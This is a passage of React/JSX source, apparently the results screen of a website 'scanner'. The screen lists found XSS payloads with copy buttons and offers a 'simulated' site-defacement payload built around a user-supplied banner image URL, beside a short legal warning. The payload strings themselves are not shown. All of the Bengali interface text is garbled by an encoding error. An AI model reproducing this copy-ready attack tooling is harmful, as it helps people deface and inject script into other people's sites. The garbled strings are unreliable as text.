                  <h4 className="text-sm font-semibold text-gray-300 mb-1">‡¶™‡¶æ‡¶ì‡¶Ø‡¶º‡¶æ XSS ‡¶™‡ßá‡¶≤‡ßã‡¶° (‡¶â‡¶¶‡¶æ‡¶π‡¶∞‡¶£):</h4>
                  <ul className="list-disc list-inside text-gray-400">
                    {scanResult.xssPayloadsFound.map((p, index) => (
                      <li key={index} className="flex justify-between items-center mb-1">
                        <span className="text-gray-200 break-all">{p.value}</span>
                        <button
                          onClick={() => copyToClipboard(p.value, `XSS ‡¶™‡ßá‡¶≤‡ßã‡¶° "${p.name}" ‡¶ï‡¶™‡¶ø ‡¶ï‡¶∞‡¶æ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá!`)}
                          className="ml-4 bg-[#30363d] hover:bg-[#444b52] text-gray-200 px-3 py-1 rounded-md text-xs"
                        >
                          ‡¶ï‡¶™‡¶ø
                        </button>
                      </li>
                    ))}
                  </ul>
                </div>
              ) : (
                <p className="text-gray-400">‡¶ï‡ßã‡¶®‡ßã XSS ‡¶¶‡ßÅ‡¶∞‡ßç‡¶¨‡¶≤‡¶§‡¶æ ‡¶∏‡¶®‡¶æ‡¶ï‡ßç‡¶§ ‡¶ï‡¶∞‡¶æ ‡¶π‡¶Ø‡¶º‡¶®‡¶ø‡•§</p>
              )}

              {/* Simulated Defacement Section */}
              <h3 className="text-lg font-semibold mb-3 text-[#58a6ff] mt-6">‡¶∏‡¶æ‡¶á‡¶ü ‡¶°‡¶ø‡¶´‡ßá‡¶∏ ‡¶ï‡¶∞‡¶æ‡¶∞ ‡¶ö‡ßá‡¶∑‡ßç‡¶ü‡¶æ (‡¶∏‡¶ø‡¶Æ‡ßÅ‡¶≤‡ßá‡¶ü‡ßá‡¶°):</h3>
              {scanResult.defacementPossible ? (
                <div className="bg-[#161b22] p-3 rounded-md border border-[#f85149]">
                  <p className="text-[#f85149] font-bold mb-2">‚ö†Ô∏è ‡¶°‡¶ø‡¶´‡ßá‡¶∏‡¶Æ‡ßá‡¶®‡ßç‡¶ü ‡¶∏‡¶Æ‡ßç‡¶≠‡¶æ‡¶¨‡ßç‡¶Ø! ({scanResult.defacementMethod})</p>
                  <p className="text-gray-300 mb-2">‡¶è‡¶á ‡¶∏‡¶æ‡¶á‡¶ü‡ßá ‡¶è‡¶Æ‡¶® ‡¶¶‡ßÅ‡¶∞‡ßç‡¶¨‡¶≤‡¶§‡¶æ ‡¶∞‡¶Ø‡¶º‡ßá‡¶õ‡ßá ‡¶Ø‡¶æ ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞ ‡¶ï‡¶∞‡ßá ‡¶∏‡¶æ‡¶á‡¶ü ‡¶°‡¶ø‡¶´‡ßá‡¶∏ ‡¶ï‡¶∞‡¶æ ‡¶Ø‡ßá‡¶§‡ßá ‡¶™‡¶æ‡¶∞‡ßá‡•§ ‡¶è‡¶ü‡¶ø ‡¶∏‡¶æ‡¶ß‡¶æ‡¶∞‡¶£‡¶§ ‡¶∞‡¶ø‡¶Æ‡ßã‡¶ü ‡¶ï‡ßã‡¶° ‡¶è‡¶ï‡ßç‡¶∏‡¶ø‡¶ï‡¶ø‡¶â‡¶∂‡¶® (RCE) ‡¶¨‡¶æ ‡¶´‡¶æ‡¶á‡¶≤ ‡¶Ü‡¶™‡¶≤‡ßã‡¶° ‡¶¶‡ßÅ‡¶∞‡ßç‡¶¨‡¶≤‡¶§‡¶æ‡¶∞ ‡¶Æ‡¶æ‡¶ß‡ßç‡¶Ø‡¶Æ‡ßá ‡¶ò‡¶ü‡ßá‡•§</p>
                  <p className="text-gray-300 mb-2">‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶¨‡ßç‡¶Ø‡¶æ‡¶®‡¶æ‡¶∞ ‡¶≤‡¶ø‡¶Ç‡¶ï ‡¶¶‡¶ø‡¶® ‡¶è‡¶¨‡¶Ç ‡¶Ü‡¶Æ‡¶∞‡¶æ ‡¶è‡¶ï‡¶ü‡¶ø **‡¶∏‡¶ø‡¶Æ‡ßÅ‡¶≤‡ßá‡¶ü‡ßá‡¶°** ‡¶°‡¶ø‡¶´‡ßá‡¶∏ ‡¶™‡ßá‡¶≤‡ßã‡¶° ‡¶§‡ßà‡¶∞‡¶ø ‡¶ï‡¶∞‡¶¨:</p>
                  <div className="mb-3">
                    <input
                      type="text"
                      className="w-full p-2 rounded-md bg-[#0d1117] border border-[#30363d] text-gray-200 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-[#58a6ff]"
                      placeholder="‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶¨‡ßç‡¶Ø‡¶æ‡¶®‡¶æ‡¶∞ ‡¶á‡¶Æ‡ßá‡¶ú‡ßá‡¶∞ URL ‡¶¶‡¶ø‡¶® (‡¶Ø‡ßá‡¶Æ‡¶®: https://example.com/hacked_banner.png)"
                      value={bannerUrl}
                      onChange={(e) => setBannerUrl(e.target.value)}
                    />
                  </div>
                  <div className="bg-[#0d1117] p-3 rounded-md border border-[#30363d] font-mono text-xs text-gray-200 relative">
                    <p className="mb-2 text-gray-400">‡¶∏‡¶ø‡¶Æ‡ßÅ‡¶≤‡ßá‡¶ü‡ßá‡¶° ‡¶°‡¶ø‡¶´‡ßá‡¶∏ ‡¶™‡ßá‡¶≤‡ßã‡¶°:</p>
                    <pre className="whitespace-pre-wrap break-all pr-10">{generateDefacementPayloadWithBanner()}</pre>
                    <button
                      onClick={() => copyToClipboard(generateDefacementPayloadWithBanner(), '‡¶°‡¶ø‡¶´‡ßá‡¶∏ ‡¶™‡ßá‡¶≤‡ßã‡¶° ‡¶ï‡¶™‡¶ø ‡¶ï‡¶∞‡¶æ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá!')}
                      className="absolute top-2 right-2 bg-[#30363d] hover:bg-[#444b52] text-gray-200 px-2 py-1 rounded-md text-xs"
                    >
                      ‡¶ï‡¶™‡¶ø
                    </button>
                  </div>
                  <p className="text-[#f85149] text-sm mt-2">
                    **‡¶∏‡¶§‡¶∞‡ßç‡¶ï‡¶§‡¶æ:** ‡¶è‡¶ü‡¶ø ‡¶∂‡ßÅ‡¶ß‡ßÅ‡¶Æ‡¶æ‡¶§‡ßç‡¶∞ ‡¶∂‡¶ø‡¶ï‡ßç‡¶∑‡¶æ‡¶Æ‡ßÇ‡¶≤‡¶ï ‡¶â‡¶¶‡ßç‡¶¶‡ßá‡¶∂‡ßç‡¶Ø‡ßá ‡¶è‡¶ï‡¶ü‡¶ø ‡¶∏‡¶ø‡¶Æ‡ßÅ‡¶≤‡ßá‡¶∂‡¶®‡•§ ‡¶ï‡ßã‡¶®‡ßã ‡¶¨‡¶æ‡¶∏‡ßç‡¶§‡¶¨ ‡¶ì‡¶Ø‡¶º‡ßá‡¶¨‡¶∏‡¶æ‡¶á‡¶ü ‡¶°‡¶ø‡¶´‡ßá‡¶∏ ‡¶ï‡¶∞‡¶æ‡¶∞ ‡¶ö‡ßá‡¶∑‡ßç‡¶ü‡¶æ ‡¶ï‡¶∞‡¶¨‡ßá‡¶® ‡¶®‡¶æ, ‡¶è‡¶ü‡¶ø ‡¶¨‡ßá‡¶Ü‡¶á‡¶®‡¶ø‡•§
                  </p>
                </div>
              ) : (
                <p className="text-gray-400">‡¶ï‡ßã‡¶®‡ßã ‡¶°‡¶ø‡¶´‡ßá‡¶∏‡¶Æ‡ßá‡¶®‡ßç‡¶ü ‡¶¶‡ßÅ‡¶∞‡ßç‡¶¨‡¶≤‡¶§‡¶æ ‡¶∏‡¶®‡¶æ‡¶ï‡ßç‡¶§ ‡¶ï‡¶∞‡¶æ ‡¶π‡¶Ø‡¶º‡¶®‡¶ø‡•§</p>
              )}
            </div>
          )}
        </div>
      </div>

      {/* Export Options & Re-Scan */}
      <div className="flex justify-between items-center mt-6">
        <button
          onClick={() => setShowExportModal(true)}
          className="bg-[#30363d] hover:bg-[#444b52] text-gray-200 font-bold py-2 px-4 rounded-md transition duration-200 ease-in-out"
        >
          ‡¶è‡¶ï‡ßç‡¶∏‡¶™‡ßã‡¶∞‡ßç‡¶ü ‡¶∞‡¶ø‡¶™‡ßã‡¶∞‡ßç‡¶ü
        </button>
        <button
          onClick={handleReScan}
          className="bg-[#58a6ff] hover:bg-[#448ee2] text-white font-bold py-2 px-4 rounded-md transition duration-200 ease-in-out"
        >
          ‡¶™‡ßÅ‡¶®‡¶∞‡¶æ‡¶Ø‡¶º ‡¶∏‡ßç‡¶ï‡ßç‡¶Ø‡¶æ‡¶® ‡¶ï‡¶∞‡ßÅ‡¶®
        </button>
      </div>

      {/* Export Modal */}
      {showExportModal && (
        <div className="fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center z-50">
          <div className="bg-[#161b22] p-6 rounded-lg shadow-xl w-full max-w-sm">
            <h3 className="text-xl font-semibold mb-4 text-center">‡¶∞‡¶ø‡¶™‡ßã‡¶∞‡ßç‡¶ü ‡¶è‡¶ï‡ßç‡¶∏‡¶™‡ßã‡¶∞‡ßç‡¶ü ‡¶ï‡¶∞‡ßÅ‡¶®</h3>
            <div className="mb-4">
              <label htmlFor="exportFormat" className="block text-gray-400 text-sm font-bold mb-2">‡¶´‡¶∞‡¶Æ‡ßç‡¶Ø‡¶æ‡¶ü ‡¶®‡¶ø‡¶∞‡ßç‡¶¨‡¶æ‡¶ö‡¶® ‡¶ï‡¶∞‡ßÅ‡¶®:</label>
              <select
                id="exportFormat"
                className="w-full p-2 rounded-md bg-[#0d1117] border border-[#30363d] text-gray-200 focus:outline-none focus:ring-2 focus:ring-[#58a6ff]"
                value={exportFormat}
                onChange={(e) => setExportFormat(e.target.value)}
              >
                <option value="PDF">PDF (‡¶∏‡ßç‡¶ü‡¶æ‡¶á‡¶≤‡¶°)</option>
                <option value="JSON">JSON (‡¶∞‚Äç‡ßç‡¶Ø)</option>
                <option value="CSV">CSV (‡¶∂‡ßÅ‡¶ß‡ßÅ‡¶Æ‡¶æ‡¶§‡ßç‡¶∞ ‡¶∏‡¶æ‡¶∞‡¶æ‡¶Ç‡¶∂)</option>
              </select>
            </div>
            <div className="flex justify-end space-x-4">
              <button
                onClick={() => setShowExportModal(false)}
                className="bg-gray-600 hover:bg-gray-700 text-white font-bold py-2 px-4 rounded-md transition duration-200 ease-in-out"
              >
                ‡¶¨‡¶æ‡¶§‡¶ø‡¶≤ ‡¶ï‡¶∞‡ßÅ‡¶®
              </button>
              <button
                onClick={handleExport}
                className="bg-[#58a6ff] hover:bg-[#448ee2] text-white font-bold py-2 px-4 rounded-md transition duration-200 ease-in-out"
              >
                ‡¶è‡¶ï‡ßç‡¶∏‡¶™‡ßã‡¶∞‡ßç‡¶ü
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default App;